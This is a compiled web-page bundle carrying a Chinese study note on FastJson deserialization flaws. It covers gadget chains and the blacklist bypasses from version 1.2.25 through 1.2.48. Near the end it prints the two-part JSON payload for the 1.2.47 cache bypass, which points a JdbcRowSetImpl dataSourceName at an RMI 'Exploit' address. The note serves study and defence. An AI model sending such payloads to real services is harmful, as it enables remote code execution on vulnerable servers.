(window.webpackJsonp=window.webpackJsonp||[]).push([[18],{420:function(s,t,a){"use strict";a.r(t);var e=a(2),r=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h3",{attrs:{id:"原理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#原理"}},[s._v("#")]),s._v(" 原理")]),s._v(" "),t("ul",[t("li",[t("p",[s._v("FastJson序列化对象为字符串使用toJSONString方法，反序列化还原对象使用：parseObject(String text)、parse(String text)、parseObject(String text, Class clazz)。其中，parseObject返回JSONObject，而parse返回的是实际类型的对象。当在没有对应类定义的情况下，会使用JSON.parseObject来获取数据。")])]),s._v(" "),t("li",[t("p",[s._v("而在反序列化的过程里，会自动调用反序列化对象中的getter、setter方法以及构造函数，这就是FastJson反序列化漏洞产生的原因。")])]),s._v(" "),t("li",[t("p",[s._v("反序列化的过程分成2步，首先是loadClass，在这个过程中会经过黑白名单检查，看这个类是否可以被反序列化。然后再进行deserialize。这个过程会不断的parse，去调用get or set方法，这个过程就可能出现恶意执行")])])]),s._v(" "),t("h3",{attrs:{id:"fastjson-1-2-22"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson-1-2-22"}},[s._v("#")]),s._v(" FastJson-1.2.22")]),s._v(" "),t("p",[s._v("两条调用链：")]),s._v(" "),t("ul",[t("li",[s._v("JdbcRowSetImpl利用链")]),s._v(" "),t("li",[s._v("TemplatesImpl利用链")])]),s._v(" "),t("p",[s._v("这里主要说templateImpl，后文会提到jdbcRowSetImpl")]),s._v(" "),t("p",[s._v("恶意payload：")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220421222748.png",alt:"image-20220414172531755"}})]),s._v(" "),t("p",[s._v("type是要被反序列的类的类型。这个payload关键有两点，一个是bytecodes，另一个是outputProperties。")]),s._v(" "),t("p",[s._v("bytecodes就是包含恶意代码的恶意类，然后对他进行base64编码，生成字节码数组得到的。")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103753.png",alt:"image-20220414172859344"}})]),s._v(" "),t("p",[s._v("因为恶意代码已经被插入到了Template类前面，那么在对这个类进行实例化的时候，就会先执行恶意代码段，也就导致了漏洞。")]),s._v(" "),t("p",[s._v("具体执行的过程就是deserialize的过程，会不断的parse，一直到调用ouputProperties的get方法")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103813.png",alt:"image-20220414190617752"}})]),s._v(" "),t("p",[s._v("这个过程会调用defineTransletClasses()，里面会把bytecodes给class，相当于class就是bytecodes，然后newInstance。此时也就触发了前面插入的恶意代码段")]),s._v(" "),t("h3",{attrs:{id:"fastjson1-2-25-1-2-41-加黑名单-利用l绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson1-2-25-1-2-41-加黑名单-利用l绕过"}},[s._v("#")]),s._v(" fastJson1.2.25-1.2.41，加黑名单，利用L绕过")]),s._v(" "),t("h3",{attrs:{id:"fastjson1-2-42-去除l判断黑名单-利用ll继续绕过"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson1-2-42-去除l判断黑名单-利用ll继续绕过"}},[s._v("#")]),s._v(" fastJson1.2.42 去除L判断黑名单，利用LL继续绕过")]),s._v(" "),t("h3",{attrs:{id:"fastjson1-2-44-l黑名单直接关闭"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson1-2-44-l黑名单直接关闭"}},[s._v("#")]),s._v(" fastJson1.2.44 L黑名单直接关闭")]),s._v(" "),t("h3",{attrs:{id:"fastjson-1-2-47-用class控制缓存"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson-1-2-47-用class控制缓存"}},[s._v("#")]),s._v(" fastJson 1.2.47 用Class控制缓存")]),s._v(" "),t("p",[s._v("因为在判断黑名单部分的逻辑是：首先看该类是否在缓存中，如果在，直接取。如果不在，那么进行黑名单判断。这也就存在漏洞，如果预先把类加到了缓存中，接下来判断的时候，就可以直接从缓存中取，不会进行黑名单判断。")]),s._v(" "),t("p",[s._v("因此，这里借助class，将jdbcRowSet加到缓存中，来绕过。")]),s._v(" "),t("p",[s._v("payload由两部分组成，首先是：")]),s._v(" "),t("div",{staticClass:"language-json line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"@type"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"java.lang.Class"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"val"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"com.sun.rowset.JdbcRowSetImpl"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("这里会将com.sun.rowset.JdbcRowSetImpl加到缓存")]),s._v(" "),t("p",[s._v("第二部分就和之前一样：")]),s._v(" "),t("div",{staticClass:"language-json line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"@type"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"com.sun.rowset.JdbcRowSetImpl"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"dataSourceName"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rmi://127.0.0.1:1099/Exploit"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"autoCommit"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("true")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在反序列化的时候，会调用setDataSourceName和setAutoCommit，在调用setAutoCommit的时候会调用connect方法，connect方法中会调用lookup")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103825.png",alt:"image-20220414174333822"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103844.png",alt:"image-20220414174341103"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220422103855.png",alt:"image-20220414174350048"}})]),s._v(" "),t("h3",{attrs:{id:"fastjson1-2-48-在loadclass时-将缓存开关设置为false-class加入黑名单"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#fastjson1-2-48-在loadclass时-将缓存开关设置为false-class加入黑名单"}},[s._v("#")]),s._v(" fastJson1.2.48 在loadClass时，将缓存开关设置为false，Class加入黑名单")])])}),[],!1,null,null,null);t.default=r.exports}}]);